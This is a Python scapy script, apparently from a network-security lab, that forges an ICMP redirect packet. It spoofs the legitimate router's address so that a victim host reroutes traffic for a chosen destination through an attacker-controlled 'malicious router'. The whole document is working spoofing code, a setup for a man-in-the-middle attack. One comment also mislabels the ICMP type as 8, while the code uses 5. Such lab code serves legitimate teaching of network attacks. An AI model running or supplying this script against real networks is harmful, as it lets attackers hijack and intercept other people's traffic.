#!/usr/bin/python3
from scapy.all import *

# Define the real and fake IP addresses
# *************************************************************************
mal_router = "192.168.60.6"	# Malicious Router's IP not in the same LAN
# *************************************************************************
router = "10.9.0.11"		# Actual Router's IP
victim = "10.9.0.5"		# Victim's IP
destination = "192.168.60.5"	# Destination IP (192.168.60.0/24 Network)
icmp_type = 5			# ICMP Type is 8 (Redirect Message)
icmp_code = 1			# ICMP Code is 1 (Redirect Datagram for the host)

# Create the IP layer for the ICMP redirect packet
ip = IP()
ip.src = router	# Router's IP as source
ip.dst = victim	# Victim's IP as destination

# Construct the ICMP redirect layer with relevant parameters
icmp = ICMP()
icmp.type = icmp_type	# Type 5 for redirect
icmp.code = icmp_code	# Code 1 for Host Redirect
icmp.gw = mal_router	# Malicious router's IP will be gateway in the ICMP message

# The enclosed IP packet should be the one that
# triggers the redirect message.
ip2 = IP()
ip2.src = victim	# Victim's IP as source
ip2.dst = destination	# Target IP as destination

# Craft the final ICMP Redirect Packet
pkt = ip/icmp/ip2/ICMP()

# Send the packet to the victim
send(pkt)
